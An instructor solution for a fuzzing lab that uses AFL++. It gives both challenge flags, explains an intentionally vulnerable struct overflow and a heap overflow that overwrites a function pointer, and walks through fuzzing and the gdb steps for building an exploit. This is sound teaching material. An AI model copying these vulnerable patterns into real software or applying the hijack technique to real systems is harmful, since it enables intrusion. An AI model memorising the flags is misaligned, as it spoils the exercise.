# Software Fuzzing (AFL++) — Instructor Solution

## Overview

Two independent challenge programs, plus an open-ended bonus track. Both challenge programs live in `student/challenge_files/` and are provided directly to students (unlike the other labs, there's no separate "encrypted" artifact — the source is the challenge, since the point is to fuzz and analyze it).

**Flags:**
- Medium: `ACSA2026{c0v3r4g3_gu1d3d_fuzz1ng_w0rks}`
- Hard: `ACSA2026{h34p_0v3rfl0w_pwn5_funct10n_p01nt3rs}`
- Bonus: none (open-ended, no fixed flag)

---

## Medium Track — `vuln_medium.c`

### The bug

```c
static struct {
    char buf[64];
    unsigned char magic[4];
} g;
...
fread(g.buf, 1, sizeof(g), f);   // reads 68 bytes into a 64-byte buf
```

`fread` is told to read `sizeof(g)` (68) bytes into `g.buf`, which is only declared as 64 bytes — the trailing 4 bytes land in `g.magic`, which is never meant to be attacker-controlled directly. This is a realistic bug pattern: using `sizeof(struct)` instead of `sizeof(member)`.

The nested `if (g.magic[0] == 0x41) { ... if (g.magic[1] == 0x42) { ... } }` chain is deliberately "fuzzer-friendly" — each correct byte creates new code coverage (a new `puts()` call = new edge), which is exactly what coverage-guided fuzzing rewards. AFL++ typically finds all four correct bytes within minutes on a modern machine.

Once all four magic bytes match, the flag is printed, and then:
```c
lut[g.magic[0]] = 0x1337;   // g.magic[0] == 0x41 == 65, way out of bounds for lut[4]
```
performs an out-of-bounds write after the flag has already been printed.  The
challenge then raises `SIGABRT` deliberately so every supported compiler and
allocator reports a reproducible AFL++ crash instead of silently accepting the
invalid write.

### Solving it

```bash
cd challenge_files/medium/
bash build.sh
afl-fuzz -i seeds -o out -- ./vuln_medium @@
# wait for a crash in out/default/crashes/
./vuln_medium out/default/crashes/id:000000,*
```

---

## Hard Track — `vuln_hard.c`

### The bug

```c
unsigned char len = 0;
fread(&len, 1, 1, f);
record_t *rec = malloc(sizeof(record_t));       // 16 bytes
handler_fn *handlers = malloc(sizeof(handler_fn) * 2);  // 2 function pointers
handlers[0] = normal_handler;
handlers[1] = normal_handler;
fread(rec->name, 1, len, f);   // len is 0-255, no bound check against 16
...
handlers[0]();
```

`len` is a fully attacker-controlled byte used directly as the `fread` copy length into a 16-byte heap buffer, with no validation. With no prior heap activity, two sequential small `malloc`s are placed adjacently by glibc in practice, so a large enough `len` overflows from `rec->name` straight into `handlers[]`. Overwriting `handlers[0]` with the address of `win()` (never called by any visible code path) redirects execution there when `handlers[0]()` is invoked, printing the flag.

The binary is built with `-O0 -fno-stack-protector -no-pie` specifically so the
intentional invalid copy remains observable, `win()` is retained in the symbol
table, and its address is static and can be read straight out of the binary
with `nm`/`objdump`, without needing to defeat ASLR. Those are intentional
simplifications for the lab, not things students need to solve.

### Solving it

```bash
cd challenge_files/hard/
bash build.sh
AFL_USE_ASAN=1 afl-fuzz -i seeds -o out -- ./vuln_hard_asan @@
# AFL++ finds a heap-buffer-overflow crash quickly (the bug is trivial to trigger)

nm ./vuln_hard | grep -E ' win$| normal_handler$'
# record the address for this build

gdb ./vuln_hard
(gdb) list 50,90
(gdb) break vuln_hard.c:76
(gdb) run seeds/seed1
(gdb) print/x rec
(gdb) print/x handlers
(gdb) print/d (char *)handlers - (char *)rec
(gdb) print/x (void *)win
# one tested VM reported GAP = 32 and win() = 0x402450
# measure both values locally; do not assume they are universal
```

Craft the payload (see the exact script in `step-by-step.md`, Step 6, in this folder) with the measured gap and `win()`'s address, then:

```bash
python3 craft_exploit.py
./vuln_hard exploit.bin
```

Expected:
```
[FLAG] ACSA2026{h34p_0v3rfl0w_pwn5_funct10n_p01nt3rs}
```

**Why this needs manual work:** finding *a* crash here is trivial for AFL++ (any `len > 16` overflows something), but the specific 8-byte value needed at the specific offset to hijack `handlers[0]` is not something random mutation will realistically stumble into — random mutation would need to guess a full pointer-width value by chance. This is the intended "expert" step: fuzzing narrows the search space, but weaponizing the crash is manual reverse engineering + exploit development, same skillset as the private-key-extraction and shellcode labs.

**Note on determinism:** the exact heap gap can vary by libc version/allocator tuning flags. If students' gdb-measured gap differs from your own test run, that's expected — the walkthrough teaches them to measure it themselves rather than hardcoding a number.

---

## Bonus Track — dlt-daemon

Open-ended, no fixed flag. If a team gets this far, a good starting suggestion is pointing them at DLT message parsing functions (`dlt_message_read`, `dlt_message_print_*`) in `src/shared/dlt_common.c`, and having them write a small harness (`main()` that reads a file into a buffer and calls one parsing function) rather than fuzzing the full daemon binary directly. Treat this purely as an exploration exercise — there is no expected "solve."

---

## Facilitation Notes

- If a team's medium-track fuzzer runs for 10+ minutes with zero new paths found, check they built with an AFL++ compiler wrapper (`afl-clang-fast` or `afl-clang-lto`) and not plain `gcc` — a non-instrumented binary gives AFL++ no coverage feedback and it degrades to blind random fuzzing.
- `afl-fuzz` will refuse to start with a "core_pattern" error if the VM hasn't been configured — `vm-setup.sh` attempts this, but a reboot can reset it; the fix is `echo core | sudo tee /proc/sys/kernel/core_pattern`.
- Expect most teams to fully solve the medium track and get *a* crash on the hard track. Fully exploiting the hard track (steps 4–6) is genuinely expert-level and it's fine if only the strongest teams get there — that's the intended difficulty curve.
